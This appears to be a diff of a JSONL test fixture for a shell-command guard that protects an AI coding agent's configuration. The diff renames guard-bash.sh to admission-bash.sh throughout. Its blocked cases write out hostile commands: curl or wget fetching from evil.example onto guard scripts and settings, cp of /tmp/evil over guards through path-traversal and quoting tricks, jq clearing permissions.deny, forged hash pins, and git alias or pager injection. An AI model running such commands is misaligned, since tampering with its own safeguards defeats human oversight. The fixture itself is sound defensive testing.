@@ -21,7 +21,7 @@
 {"id":"ar-shellcheck-installer","rule":"mutate-aimed-surface","want":"allow","cmd":"shellcheck templates/multi_model/dot_agents/scripts/setup_models.sh"}
 {"id":"ar-uninstall-stays-open","rule":"redirect-floor-surface","want":"allow","cmd":"npm uninstall -g @musistudio/claude-code-router"}
 {"id":"b8-commit-msg-naming-live","rule":"mutate-aimed-surface","want":"allow","cmd":"git commit -am \"docs: floor-deny.sh --live notes\""}
-{"id":"b8-read-a-pin","rule":"mutate-aimed-surface","want":"allow","cmd":"cat ~/.claude/.helm-pins/guard-bash.sh.sha256"}
+{"id":"b8-read-a-pin","rule":"mutate-aimed-surface","want":"allow","cmd":"cat ~/.claude/.helm-pins/admission-bash.sh.sha256"}
 {"id":"b8-read-docs-quoting-live","rule":"mutate-aimed-surface","want":"allow","cmd":"sed -n '/floor-install.sh --live/p' docs/explanation/admission-baseline.md"}
 {"id":"b8-redirect-onto-instr-pin","rule":"redirect-floor-surface","want":"block","cmd":"echo forged > {cfg}/.helm-instructions.sha256"}
 {"id":"h769-tee-onto-snapshot-ledger","rule":"mutate-onto-surface","want":"block","cmd":"tee -a {cfg}/.helm-snapshots < /tmp/row"}
@@ -32,7 +32,7 @@
 {"id":"b8-rm-rf-helm-pins","rule":"mutate-aimed-surface","want":"block","cmd":"rm -rf {cfg}/.helm-pins"}
 {"id":"b8-run-the-suite","rule":"mutate-aimed-surface","want":"allow","cmd":"sh tests/admission/baseline/baseline.test.sh"}
 {"id":"b8-sandbox-install-ok","rule":"mutate-aimed-surface","want":"allow","cmd":"sh bin/floor-install.sh /tmp/sandbox --apply"}
-{"id":"cfg280-helm-pins-is-not-allowlisted","rule":"redirect-floor-surface","want":"block","cmd":"echo x > {cfg}/.helm-pins/guard-bash.sh.sha256","why":"B8 redirect onto .helm-pins · CFG280 .helm-pins is NOT allowlisted"}
+{"id":"cfg280-helm-pins-is-not-allowlisted","rule":"redirect-floor-surface","want":"block","cmd":"echo x > {cfg}/.helm-pins/admission-bash.sh.sha256","why":"B8 redirect onto .helm-pins · CFG280 .helm-pins is NOT allowlisted"}
 {"id":"const-1-a-project-root-claude-md","rule":"redirect-floor-surface","want":"allow","cmd":"printf 'x' > /tmp/proj/CLAUDE.md"}
 {"id":"const-1-append-onto-it","rule":"redirect-floor-surface","want":"block","cmd":"printf 'x' >> {home}/.claude/CLAUDE.md"}
 {"id":"const-1-cat-reads-it","rule":"redirect-floor-surface","want":"allow","cmd":"cat {home}/.claude/CLAUDE.md"}
@@ -50,21 +50,21 @@
 {"id":"dots-back-the-cfg-dir-up","rule":"mutate-onto-surface","want":"allow","cmd":"tar -czf /tmp/b.tgz {home}/Library/../.claude"}
 {"id":"dots-claude-md","rule":"redirect-floor-surface","want":"block","cmd":"printf x > {home}/Library/../.claude/CLAUDE.md"}
 {"id":"dots-copy-a-surface-out","rule":"mutate-onto-surface","want":"allow","cmd":"cp {home}/Library/../.claude/settings.json /tmp/s.json"}
-{"id":"dots-cp-onto-a-guard","rule":"mutate-onto-surface","want":"block","cmd":"cp /tmp/evil {home}/Library/../.claude/bin/guard-bash.sh"}
+{"id":"dots-cp-onto-a-guard","rule":"mutate-onto-surface","want":"block","cmd":"cp /tmp/evil {home}/Library/../.claude/bin/admission-bash.sh"}
 {"id":"dots-dd-onto-a-surface","rule":"dd-at-surface","want":"block","cmd":"dd if=/tmp/evil of={home}/Library/../.claude/settings.json"}
-{"id":"dots-depth-16-onto-guard","rule":"mutate-onto-surface","want":"block","cmd":"cp /tmp/evil {home}/d1/d2/d3/d4/d5/d6/d7/d8/d9/d10/d11/d12/d13/d14/d15/d16/../../../../../../../../../../../../../../../../.claude/bin/guard-bash.sh"}
+{"id":"dots-depth-16-onto-guard","rule":"mutate-onto-surface","want":"block","cmd":"cp /tmp/evil {home}/d1/d2/d3/d4/d5/d6/d7/d8/d9/d10/d11/d12/d13/d14/d15/d16/../../../../../../../../../../../../../../../../.claude/bin/admission-bash.sh"}
 {"id":"dots-depth-16-redirect","rule":"redirect-floor-surface","want":"block","cmd":"echo {} > {home}/d1/d2/d3/d4/d5/d6/d7/d8/d9/d10/d11/d12/d13/d14/d15/d16/../../../../../../../../../../../../../../../../.claude/settings.json"}
-{"id":"dots-depth-17-onto-guard","rule":"mutate-onto-surface","want":"block","cmd":"cp /tmp/evil {home}/d1/d2/d3/d4/d5/d6/d7/d8/d9/d10/d11/d12/d13/d14/d15/d16/d17/../../../../../../../../../../../../../../../../../.claude/bin/guard-bash.sh"}
+{"id":"dots-depth-17-onto-guard","rule":"mutate-onto-surface","want":"block","cmd":"cp /tmp/evil {home}/d1/d2/d3/d4/d5/d6/d7/d8/d9/d10/d11/d12/d13/d14/d15/d16/d17/../../../../../../../../../../../../../../../../../.claude/bin/admission-bash.sh"}
 {"id":"dots-depth-17-redirect","rule":"redirect-floor-surface","want":"block","cmd":"echo {} > {home}/d1/d2/d3/d4/d5/d6/d7/d8/d9/d10/d11/d12/d13/d14/d15/d16/d17/../../../../../../../../../../../../../../../../../.claude/settings.json"}
 {"id":"dots-depth-20-lands-elsewhere","rule":"mutate-onto-surface","want":"allow","cmd":"cp /tmp/evil {home}/d1/d2/d3/d4/d5/d6/d7/d8/d9/d10/d11/d12/d13/d14/d15/d16/d17/d18/d19/d20/../../../../../../../../../../../../../../../../../../../../Downloads/x"}
-{"id":"dots-depth-20-onto-guard","rule":"mutate-onto-surface","want":"block","cmd":"cp /tmp/evil {home}/d1/d2/d3/d4/d5/d6/d7/d8/d9/d10/d11/d12/d13/d14/d15/d16/d17/d18/d19/d20/../../../../../../../../../../../../../../../../../../../../.claude/bin/guard-bash.sh"}
+{"id":"dots-depth-20-onto-guard","rule":"mutate-onto-surface","want":"block","cmd":"cp /tmp/evil {home}/d1/d2/d3/d4/d5/d6/d7/d8/d9/d10/d11/d12/d13/d14/d15/d16/d17/d18/d19/d20/../../../../../../../../../../../../../../../../../../../../.claude/bin/admission-bash.sh"}
 {"id":"dots-depth-20-redirect","rule":"redirect-floor-surface","want":"block","cmd":"echo {} > {home}/d1/d2/d3/d4/d5/d6/d7/d8/d9/d10/d11/d12/d13/d14/d15/d16/d17/d18/d19/d20/../../../../../../../../../../../../../../../../../../../../.claude/settings.json"}
-{"id":"dots-depth-40-onto-guard","rule":"mutate-onto-surface","want":"block","cmd":"cp /tmp/evil {home}/d1/d2/d3/d4/d5/d6/d7/d8/d9/d10/d11/d12/d13/d14/d15/d16/d17/d18/d19/d20/d21/d22/d23/d24/d25/d26/d27/d28/d29/d30/d31/d32/d33/d34/d35/d36/d37/d38/d39/d40/../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../.claude/bin/guard-bash.sh"}
+{"id":"dots-depth-40-onto-guard","rule":"mutate-onto-surface","want":"block","cmd":"cp /tmp/evil {home}/d1/d2/d3/d4/d5/d6/d7/d8/d9/d10/d11/d12/d13/d14/d15/d16/d17/d18/d19/d20/d21/d22/d23/d24/d25/d26/d27/d28/d29/d30/d31/d32/d33/d34/d35/d36/d37/d38/d39/d40/../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../.claude/bin/admission-bash.sh"}
 {"id":"dots-depth-40-redirect","rule":"redirect-floor-surface","want":"block","cmd":"echo {} > {home}/d1/d2/d3/d4/d5/d6/d7/d8/d9/d10/d11/d12/d13/d14/d15/d16/d17/d18/d19/d20/d21/d22/d23/d24/d25/d26/d27/d28/d29/d30/d31/d32/d33/d34/d35/d36/d37/d38/d39/d40/../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../.claude/settings.json"}
 {"id":"dots-dot-slash-mixed-in","rule":"mutate-onto-surface","want":"block","cmd":"cp /tmp/evil {home}/./Library/../.claude/hooks/x.sh"}
 {"id":"dots-four-levels-deep","rule":"mutate-onto-surface","want":"block","cmd":"cp /tmp/evil {home}/a/b/c/d/../../../../.claude/settings.json"}
 {"id":"dots-git-c-through","rule":"mutate-onto-surface","want":"allow","cmd":"git -C {home}/Documents/../repo status"}
-{"id":"dots-grep-a-guard","rule":"mutate-onto-surface","want":"allow","cmd":"/usr/bin/grep -c sponge {home}/Library/../.claude/bin/guard-bash.sh"}
+{"id":"dots-grep-a-guard","rule":"mutate-onto-surface","want":"allow","cmd":"/usr/bin/grep -c sponge {home}/Library/../.claude/bin/admission-bash.sh"}
 {"id":"dots-in-place-sed","rule":"inplace-floor-surface","want":"block","cmd":"sed -i \"\" s/a/b/ {home}/Library/../.claude/settings.json"}
 {"id":"dots-list-an-archive","rule":"mutate-onto-surface","want":"allow","cmd":"unzip -l {home}/Library/../.claude/backups/x.tgz"}
 {"id":"dots-make-c","rule":"mutate-onto-surface","want":"allow","cmd":"make -C ../build all"}
@@ -82,7 +82,7 @@
 {"id":"find-exec-terminator","rule":"mutate-onto-surface","want":"block","cmd":"find {home}/.claude/bin -name 'guard-*.sh' -exec cp /tmp/evil {} +"}
 {"id":"find-execdir","rule":"mutate-onto-surface","want":"block","cmd":"find {home}/.claude/bin -name '*.sh' -execdir cp /tmp/evil {} \\;"}
 {"id":"find-f-root-spelling","rule":"mutate-onto-surface","want":"block","cmd":"find -f {home}/.claude/bin -name '*.sh' -exec cp /tmp/evil {} \\;"}
-{"id":"find-heredoc-doc-direct","rule":"mutate-onto-surface","want":"block","cmd":"cat > /tmp/n.md <<EOF\ncp /tmp/evil {home}/.claude/bin/guard-bash.sh\nEOF","why":"FIND heredoc doc, direct · HD-FLAT c4 body names the config"}
+{"id":"find-heredoc-doc-direct","rule":"mutate-onto-surface","want":"block","cmd":"cat > /tmp/n.md <<EOF\ncp /tmp/evil {home}/.claude/bin/admission-bash.sh\nEOF","why":"FIND heredoc doc, direct · HD-FLAT c4 body names the config"}
 {"id":"find-heredoc-doc-find-form","rule":"mutate-onto-surface","want":"block","cmd":"cat > /tmp/n.md <<EOF\nfind {home}/.claude/bin -exec cp /tmp/evil {} \\;\nEOF"}
 {"id":"find-heredoc-into-sh","rule":"mutate-onto-surface","want":"block","cmd":"sh <<EOF\nfind {home}/.claude/bin -exec cp /tmp/evil {} \\;\nEOF"}
 {"id":"find-no-filter-at-all","rule":"mutate-onto-surface","want":"block","cmd":"find {home}/.claude/bin -type f -exec cp /tmp/evil {} \\;"}
@@ -96,35 +96,35 @@
 {"id":"find-sudo-wrapper","rule":"mutate-onto-surface","want":"block","cmd":"sudo find {home}/.claude/bin -name '*.sh' -exec cp /tmp/evil {} \\;"}
 {"id":"find-surface-as-root-5","rule":"mutate-onto-surface","want":"block","cmd":"find /tmp/a /tmp/b /tmp/c /tmp/d {home}/.claude/bin -name '*.sh' -exec cp /tmp/evil {} \\;"}
 {"id":"find-tee-a-guard","rule":"mutate-aimed-surface","want":"block","cmd":"find {home}/.claude/bin -name '*.sh' -exec tee {} \\;"}
-{"id":"fs-03-behind-an-assignment","rule":"outflag-onto-surface","want":"block","cmd":"FOO=1 curl -sfL https://e.example/x -o ~/.claude/bin/guard-bash.sh"}
-{"id":"fs-03-behind-sudo","rule":"outflag-onto-surface","want":"block","cmd":"sudo curl -sfL https://e.example/x -o ~/.claude/bin/guard-bash.sh"}
+{"id":"fs-03-behind-an-assignment","rule":"outflag-onto-surface","want":"block","cmd":"FOO=1 curl -sfL https://e.example/x -o ~/.claude/bin/admission-bash.sh"}
+{"id":"fs-03-behind-sudo","rule":"outflag-onto-surface","want":"block","cmd":"sudo curl -sfL https://e.example/x -o ~/.claude/bin/admission-bash.sh"}
 {"id":"fs-03-curl-o-into-a-project","rule":"dd-at-surface","want":"allow","cmd":"curl -sfL https://example.com/x -o ~/port/harbor/README.tmp"}
 {"id":"fs-03-curl-o-into-tmp","rule":"dd-at-surface","want":"allow","cmd":"curl -sfL https://example.com/x -o /tmp/x"}
-{"id":"fs-03-curl-o-onto-a-guard","rule":"outflag-onto-surface","want":"block","cmd":"curl -sfL https://evil.example/x -o ~/.claude/bin/guard-bash.sh"}
+{"id":"fs-03-curl-o-onto-a-guard","rule":"outflag-onto-surface","want":"block","cmd":"curl -sfL https://evil.example/x -o ~/.claude/bin/admission-bash.sh"}
 {"id":"fs-03-curl-o-takes-no-value","rule":"dd-at-surface","want":"allow","cmd":"curl -O https://example.com/pkg.tgz"}
-{"id":"fs-03-curl-output-joined","rule":"outflag-onto-surface","want":"block","cmd":"curl -sfL https://evil.example/x --output=~/.claude/bin/guard-bash.sh"}
-{"id":"fs-03-curl-output-onto-a-guard","rule":"outflag-onto-surface","want":"block","cmd":"curl -sfL https://evil.example/x --output ~/.claude/bin/guard-bash.sh"}
-{"id":"fs-03-dd-of-still-blocked","rule":"dd-at-surface","want":"block","cmd":"dd if=/tmp/evil of=~/.claude/bin/guard-bash.sh"}
-{"id":"fs-03-dot-segment-spelling","rule":"outflag-onto-surface","want":"block","cmd":"curl -sfL https://e.example/x -o ~/.claude/hooks/../bin/guard-bash.sh"}
+{"id":"fs-03-curl-output-joined","rule":"outflag-onto-surface","want":"block","cmd":"curl -sfL https://evil.example/x --output=~/.claude/bin/admission-bash.sh"}
+{"id":"fs-03-curl-output-onto-a-guard","rule":"outflag-onto-surface","want":"block","cmd":"curl -sfL https://evil.example/x --output ~/.claude/bin/admission-bash.sh"}
+{"id":"fs-03-dd-of-still-blocked","rule":"dd-at-surface","want":"block","cmd":"dd if=/tmp/evil of=~/.claude/bin/admission-bash.sh"}
+{"id":"fs-03-dot-segment-spelling","rule":"outflag-onto-surface","want":"block","cmd":"curl -sfL https://e.example/x -o ~/.claude/hooks/../bin/admission-bash.sh"}
 {"id":"fs-03-gcc-o-onto-hooks","rule":"outflag-onto-surface","want":"block","cmd":"gcc /tmp/evil.c -o ~/.claude/hooks/x.sh"}
-{"id":"fs-03-grep-c-a-word-in-a-guard","rule":"dd-at-surface","want":"allow","cmd":"/usr/bin/grep -c sponge ~/.claude/bin/guard-bash.sh"}
-{"id":"fs-03-grep-o-for-that-path","rule":"dd-at-surface","want":"allow","cmd":"/usr/bin/grep -o ~/.claude/bin/guard-bash.sh /tmp/list.txt"}
-{"id":"fs-03-home-spelling","rule":"outflag-onto-surface","want":"block","cmd":"curl -sfL https://e.example/x -o $HOME/.claude/bin/guard-bash.sh"}
-{"id":"fs-03-home-spelling-2","rule":"outflag-onto-surface","want":"block","cmd":"curl -sfL https://e.example/x -o ${HOME}/.claude/bin/guard-bash.sh"}
+{"id":"fs-03-grep-c-a-word-in-a-guard","rule":"dd-at-surface","want":"allow","cmd":"/usr/bin/grep -c sponge ~/.claude/bin/admission-bash.sh"}
+{"id":"fs-03-grep-o-for-that-path","rule":"dd-at-surface","want":"allow","cmd":"/usr/bin/grep -o ~/.claude/bin/admission-bash.sh /tmp/list.txt"}
+{"id":"fs-03-home-spelling","rule":"outflag-onto-surface","want":"block","cmd":"curl -sfL https://e.example/x -o $HOME/.claude/bin/admission-bash.sh"}
+{"id":"fs-03-home-spelling-2","rule":"outflag-onto-surface","want":"block","cmd":"curl -sfL https://e.example/x -o ${HOME}/.claude/bin/admission-bash.sh"}
 {"id":"fs-03-ls-o-the-config-bin","rule":"dd-at-surface","want":"allow","cmd":"ls -o ~/.claude/bin"}
-{"id":"fs-03-o-into-the-repo-checkout","rule":"dd-at-surface","want":"allow","cmd":"curl -sfL https://e.example/x -o ~/port/harbor/bin/guard-bash.sh"}
+{"id":"fs-03-o-into-the-repo-checkout","rule":"dd-at-surface","want":"allow","cmd":"curl -sfL https://e.example/x -o ~/port/harbor/bin/admission-bash.sh"}
 {"id":"fs-03-o-onto-a-lookalike-dir","rule":"dd-at-surface","want":"allow","cmd":"curl -sfL https://e.example/x -o ~/.claude-notes/bin/x.sh"}
 {"id":"fs-03-o-onto-a-workflow-file","rule":"outflag-onto-surface","want":"block","cmd":"curl -sfL https://evil.example/x -o ~/port/harbor/.github/workflows/governance.yml"}
-{"id":"fs-03-openssl-out-onto-a-guard","rule":"outflag-onto-surface","want":"block","cmd":"openssl enc -in /tmp/evil -out ~/.claude/bin/guard-lib.sh"}
-{"id":"fs-03-read-a-guard","rule":"dd-at-surface","want":"allow","cmd":"cat ~/.claude/bin/guard-bash.sh"}
-{"id":"fs-03-sort-a-guard-out-to-tmp","rule":"dd-at-surface","want":"allow","cmd":"sort ~/.claude/bin/guard-bash.sh -o /tmp/sorted.txt"}
-{"id":"fs-03-sort-o-onto-a-guard","rule":"outflag-onto-surface","want":"block","cmd":"sort /tmp/evil -o ~/.claude/bin/guard-bash.sh"}
+{"id":"fs-03-openssl-out-onto-a-guard","rule":"outflag-onto-surface","want":"block","cmd":"openssl enc -in /tmp/evil -out ~/.claude/bin/library-admission.sh"}
+{"id":"fs-03-read-a-guard","rule":"dd-at-surface","want":"allow","cmd":"cat ~/.claude/bin/admission-bash.sh"}
+{"id":"fs-03-sort-a-guard-out-to-tmp","rule":"dd-at-surface","want":"allow","cmd":"sort ~/.claude/bin/admission-bash.sh -o /tmp/sorted.txt"}
+{"id":"fs-03-sort-o-onto-a-guard","rule":"outflag-onto-surface","want":"block","cmd":"sort /tmp/evil -o ~/.claude/bin/admission-bash.sh"}
 {"id":"fs-03-wget-o-onto-settings","rule":"outflag-onto-surface","want":"block","cmd":"wget -q https://evil.example/s.json -O ~/.claude/settings.json"}
 {"id":"fs-05-claude-notes-bin","rule":"redirect-floor-surface","want":"allow","cmd":"echo x > ~/.claude-notes/bin/x.sh","why":"CFG280 FP a .claude-notes sibling · fs-05 .claude-notes/bin"}
 {"id":"fs-05-cp-onto-memory-sh","rule":"mutate-onto-surface","want":"block","cmd":"cp /tmp/evil ~/.claude/bin/memory.sh"}
-{"id":"fs-05-floor-still-blocked","rule":"redirect-floor-surface","want":"block","cmd":"echo x > ~/.claude/bin/floor-hook.sh"}
+{"id":"fs-05-floor-still-blocked","rule":"redirect-floor-surface","want":"block","cmd":"echo x > ~/.claude/bin/admission-hook.sh"}
 {"id":"fs-05-grep-the-newly-protected","rule":"redirect-floor-surface","want":"allow","cmd":"/usr/bin/grep -c sponge ~/.claude/bin/context-resolve.sh"}
-{"id":"fs-05-guard-still-blocked","rule":"redirect-floor-surface","want":"block","cmd":"echo x > ~/.claude/bin/guard-bash.sh"}
+{"id":"fs-05-guard-still-blocked","rule":"redirect-floor-surface","want":"block","cmd":"echo x > ~/.claude/bin/admission-bash.sh"}
 {"id":"fs-05-hooks-arm-unchanged","rule":"redirect-floor-surface","want":"block","cmd":"echo x > ~/.claude/hooks/anything.sh"}
 {"id":"fs-05-ls-the-directory","rule":"redirect-floor-surface","want":"allow","cmd":"ls -la ~/.claude/bin"}
 {"id":"fs-05-read-context-resolve","rule":"redirect-floor-surface","want":"allow","cmd":"cat ~/.claude/bin/context-resolve.sh"}
@@ -132,7 +132,7 @@
 {"id":"fs-05-redirect-context-resolve","rule":"redirect-floor-surface","want":"block","cmd":"echo x > ~/.claude/bin/context-resolve.sh"}
 {"id":"fs-05-redirect-restore-sh-harbor-name","rule":"redirect-floor-surface","want":"block","cmd":"echo x > ~/.claude/bin/deploy-restore.sh"}
 {"id":"fs-05-redirect-worklog-push","rule":"redirect-floor-surface","want":"block","cmd":"echo x > ~/.claude/bin/worklog-push.sh"}
-{"id":"fs-05-repo-checkout-bin","rule":"redirect-floor-surface","want":"allow","cmd":"echo x > ~/port/harbor/bin/guard-bash.sh"}
+{"id":"fs-05-repo-checkout-bin","rule":"redirect-floor-surface","want":"allow","cmd":"echo x > ~/port/harbor/bin/admission-bash.sh"}
 {"id":"fs-05-same-basename-in-tmp","rule":"redirect-floor-surface","want":"allow","cmd":"echo x > /tmp/context-resolve.sh"}
 {"id":"gw265-apply-names-a-surface-as-input","rule":"git-write-at-surface","want":"allow","cmd":"git apply .github/workflows/governance.yml"}
 {"id":"gw265-c-prefix-does-not-hide-it","rule":"git-write-at-surface","want":"block","cmd":"git -c x=y checkout .github/workflows/governance.yml"}
@@ -151,7 +151,7 @@
 {"id":"gw265-fp-restore-an-ordinary-path","rule":"git-write-at-surface","want":"allow","cmd":"git restore src/app.py"}
 {"id":"gw265-fp-switch-a-branch","rule":"git-write-at-surface","want":"allow","cmd":"git switch main"}
 {"id":"gw265-global-c-before-the-verb","rule":"git-write-at-surface","want":"block","cmd":"git -C /tmp/r checkout .github/workflows/governance.yml"}
-{"id":"gw265-restore-a-guard-under-bin","rule":"git-write-at-surface","want":"block","cmd":"git restore {cfg}/bin/guard-bash.sh"}
+{"id":"gw265-restore-a-guard-under-bin","rule":"git-write-at-surface","want":"block","cmd":"git restore {cfg}/bin/admission-bash.sh"}
 {"id":"gw265-restore-a-workflow","rule":"git-write-at-surface","want":"block","cmd":"git restore .github/workflows/governance.yml"}
 {"id":"gw265-second-segment-of-an","rule":"git-write-at-surface","want":"block","cmd":"git status && git restore .github/workflows/governance.yml"}
 {"id":"gw265-uncaught-checkout","rule":"git-write-at-surface","want":"allow","cmd":"git checkout -- ."}
@@ -160,7 +160,7 @@
 {"id":"hd-flat-c3-redirect-onto-config","rule":"redirect-floor-surface","want":"block","cmd":"cat > {home}/.claude/settings.json <<EOF\n{}\nEOF"}
 {"id":"i164-bun-pointed-at-a-workflow","rule":"interpreter-at-surface","want":"block","cmd":"bun .github/workflows/governance.yml"}
 {"id":"i164-command-builtin-wrapper","rule":"interpreter-at-surface","want":"block","cmd":"command python3 {cfg}/settings.json"}
-{"id":"i164-grep-a-guard-for-an-interpreter","rule":"interpreter-at-surface","want":"allow","cmd":"/usr/bin/grep -c node {cfg}/bin/guard-bash.sh"}
+{"id":"i164-grep-a-guard-for-an-interpreter","rule":"interpreter-at-surface","want":"allow","cmd":"/usr/bin/grep -c node {cfg}/bin/admission-bash.sh"}
 {"id":"i164-grep-an-interpreter-name-in-a-workflow","rule":"interpreter-at-surface","want":"allow","cmd":"/usr/bin/grep -n \"bun\" .github/workflows/governance.yml"}
 {"id":"i164-grep-c-python3-in-a-workflow","rule":"interpreter-at-surface","want":"allow","cmd":"/usr/bin/grep -c \"python3\" .github/workflows/governance.yml"}
 {"id":"i164-grep-r-over-the-workflow-dir","rule":"interpreter-at-surface","want":"allow","cmd":"/usr/bin/grep -rn \"deno\" .github/workflows/"}
@@ -172,7 +172,7 @@
 {"id":"i164g-a-write-subcommand-plus-an-interpreter","rule":"interpreter-at-surface","want":"block","cmd":"git apply /tmp/p && bun .github/workflows/governance.yml"}
 {"id":"i164g-git-c-alias-injection","rule":"interpreter-at-surface","want":"block","cmd":"git -c alias.g='!sh -c x' grep -n bun -- .github/workflows/governance.yml"}
 {"id":"i164g-git-c-core-pager-injection","rule":"interpreter-at-surface","want":"block","cmd":"git -c core.pager='bun -e 1' grep -n x -- .github/workflows/governance.yml"}
-{"id":"i164g-git-grep-a-guard-for-a-sink-name","rule":"interpreter-at-surface","want":"allow","cmd":"git grep -n sponge -- {cfg}/bin/guard-bash.sh"}
+{"id":"i164g-git-grep-a-guard-for-a-sink-name","rule":"interpreter-at-surface","want":"allow","cmd":"git grep -n sponge -- {cfg}/bin/admission-bash.sh"}
 {"id":"i164g-git-grep-an-interpreter-in-a-workflow","rule":"interpreter-at-surface","want":"allow","cmd":"git grep -n bun -- .github/workflows/governance.yml"}
 {"id":"i164g-git-grep-redirecting-onto-the-surface","rule":"redirect-floor-surface","want":"block","cmd":"git grep -n bun -- /tmp/x > .github/workflows/governance.yml"}
 {"id":"i164g-git-grep-with-a-global-c-flag","rule":"interpreter-at-surface","want":"allow","cmd":"git -C /tmp grep -n python3 -- .github/workflows/governance.yml"}
@@ -187,7 +187,7 @@
 {"id":"i334-two-reader-segments-one-interpreter","rule":"redirect-floor-surface","want":"allow","cmd":"python3 -c 'print(1)'; wc -l .github/workflows/governance.yml; cat .github/workflows/governance.yml"}
 {"id":"i334-variable-expanded-interpreter-target","rule":"interpreter-at-surface","want":"block","cmd":"S=.github/workflows/governance.yml; bun \"$S\""}
 {"id":"i334-wc-a-surface-after-an-interpreter-segment","rule":"redirect-floor-surface","want":"allow","cmd":"python3 -c 'print(1)'; wc -l .github/workflows/governance.yml"}
-{"id":"p10-cp-l-onto-a-pin","rule":"mutate-onto-surface","want":"block","cmd":"cp -l /tmp/x {cfg}/.helm-pins/guard-bash.sh.sha256"}
+{"id":"p10-cp-l-onto-a-pin","rule":"mutate-onto-surface","want":"block","cmd":"cp -l /tmp/x {cfg}/.helm-pins/admission-bash.sh.sha256"}
 {"id":"p10-link-1-onto-a-pin","rule":"mutate-aimed-surface","want":"block","cmd":"link /tmp/x {cfg}/.helm-instructions.sha256"}
 {"id":"p13-cp-onto-other-claude","rule":"mutate-onto-surface","want":"block","cmd":"cp /tmp/e ~alice/.claude/settings.json"}
 {"id":"p13-list-cfg-then-cp","rule":"mutate-onto-surface","want":"block","cmd":"unzip -l ~/.claude/b.tgz; cp /tmp/evil ~/.claude/settings.json"}
@@ -199,14 +199,14 @@
 {"id":"plu-read-mode-o-inside","rule":"outflag-onto-surface","want":"block","cmd":"plutil -extract permissions json -o {home}/.claude/settings.json /tmp/evil.json"}
 {"id":"plu-two-o-first-inside","rule":"outflag-onto-surface","want":"block","cmd":"plutil -convert xml1 -o {home}/.claude/settings.json -o /tmp/a.plist /tmp/e.json"}
 {"id":"plu-two-o-last-inside","rule":"outflag-onto-surface","want":"block","cmd":"plutil -convert xml1 -o /tmp/a.plist -o {home}/.claude/settings.json /tmp/e.json"}
-{"id":"q1-quoted-guard-clobber","rule":"mutate-onto-surface","want":"block","cmd":"cp /dev/null \"{cfg}/bin/guard-bash.sh\""}
+{"id":"q1-quoted-guard-clobber","rule":"mutate-onto-surface","want":"block","cmd":"cp /dev/null \"{cfg}/bin/admission-bash.sh\""}
 {"id":"q1-quoted-surface-write","rule":"redirect-floor-surface","want":"block","cmd":"echo {} > \"{cfg}/settings.json\""}
 {"id":"q3-var-held-surface","rule":"redirect-floor-surface","want":"block","cmd":"F={cfg}/settings.json; echo {} > $F"}
 {"id":"q7-jq-writing-settings","rule":"redirect-floor-surface","want":"block","cmd":"jq '.permissions.deny=[]' {cfg}/settings.json > {cfg}/settings.json"}
 {"id":"r138-f1-find-before-the-root","rule":"mutate-onto-surface","want":"block","cmd":"find -- {home}/.claude/bin -name 'guard-*.sh' -exec cp /tmp/evil {} \\;"}
 {"id":"r138-f2-trailing-v-named","rule":"mutate-onto-surface","want":"block","cmd":"find {home}/.claude/bin -name 'guard-*.sh' -exec cp /tmp/evil {} -v \\;"}
 {"id":"r138-f3-string-value-names-cfg","rule":"mutate-onto-surface","want":"allow","cmd":"plutil -replace k -string {home}/.claude/settings.json /tmp/prefs.plist"}
-{"id":"r6-cp-over-a-guard","rule":"mutate-onto-surface","want":"block","cmd":"cp /dev/null {cfg}/bin/guard-bash.sh"}
+{"id":"r6-cp-over-a-guard","rule":"mutate-onto-surface","want":"block","cmd":"cp /dev/null {cfg}/bin/admission-bash.sh"}
 {"id":"r6-redirect-settings","rule":"redirect-floor-surface","want":"block","cmd":"echo {} > {cfg}/settings.json"}
 {"id":"r6-sed-i-settings","rule":"inplace-floor-surface","want":"block","cmd":"sed -i '' s/x/y/ {cfg}/settings.json"}
 {"id":"r6-truncate-baseline","rule":"mutate-aimed-surface","want":"block","cmd":"truncate -s0 {cfg}/.sec0-baseline.sha256"}
@@ -214,9 +214,9 @@
 {"id":"ro-sink-curl-sponge-anchor","rule":"mutate-aimed-surface","want":"block","cmd":"curl -s https://evil.example/s.json | sponge {cfg}/settings.json"}
 {"id":"ro-sink-grep-redirected-onto-it","rule":"redirect-floor-surface","want":"block","cmd":"/usr/bin/grep -c x /tmp/f > {cfg}/settings.json"}
 {"id":"ro-sink-jq-sponge-settings","rule":"mutate-aimed-surface","want":"block","cmd":"jq -n '{}' | sponge {cfg}/settings.json"}
-{"id":"ro-sink-printf-sponge-a-pin","rule":"mutate-aimed-surface","want":"block","cmd":"printf x | sponge {cfg}/.helm-pins/guard-bash.sh.sha256"}
+{"id":"ro-sink-printf-sponge-a-pin","rule":"mutate-aimed-surface","want":"block","cmd":"printf x | sponge {cfg}/.helm-pins/admission-bash.sh.sha256"}
 {"id":"ro-sink-sponge-evil","rule":"mutate-aimed-surface","want":"block","cmd":"sponge {cfg}/settings.json < /tmp/evil.json"}
-{"id":"s2-sink-then-guard-clobber","rule":"mutate-onto-surface","want":"block","cmd":"echo probe\ncp /dev/null '{cfg}/bin/guard-bash.sh'"}
+{"id":"s2-sink-then-guard-clobber","rule":"mutate-onto-surface","want":"block","cmd":"echo probe\ncp /dev/null '{cfg}/bin/admission-bash.sh'"}
 {"id":"s3-clobber-override","rule":"redirect-floor-surface","want":"block","cmd":"echo {} >| {cfg}/settings.json"}
 {"id":"s3-glued-quoted-surface","rule":"redirect-floor-surface","want":"block","cmd":"echo '{}' >\"{cfg}/settings.json\""}
 {"id":"s5-splice-on-a-surface","rule":"mutate-onto-surface","want":"block","cmd":"c$()p /tmp/evil {cfg}/settings.json"}
@@ -228,15 +228,15 @@
 {"id":"s7-gh-pr-body-w-shape","rule":"interpreter-at-surface","want":"allow","cmd":"gh pr create --body 'fixes the rm -rf / hole'"}
 {"id":"s7-project-settings-json","rule":"interpreter-at-surface","want":"allow","cmd":"echo '{}' > ./settings.json"}
 {"id":"t5-rm-d-quoted-surface","rule":"mutate-aimed-surface","want":"block","cmd":"rm -d '{home}/.claude/settings.json'"}
-{"id":"tok-206-awk-over-a-guard-file","rule":"mutate-onto-surface","want":"allow","cmd":"awk {print $1, $2} {cfg}/bin/guard-bash.sh"}
+{"id":"tok-206-awk-over-a-guard-file","rule":"mutate-onto-surface","want":"allow","cmd":"awk {print $1, $2} {cfg}/bin/admission-bash.sh"}
 {"id":"tok-206-awk-program-with-a-comma","rule":"mutate-onto-surface","want":"allow","cmd":"awk {print $1, $2} /tmp/f"}
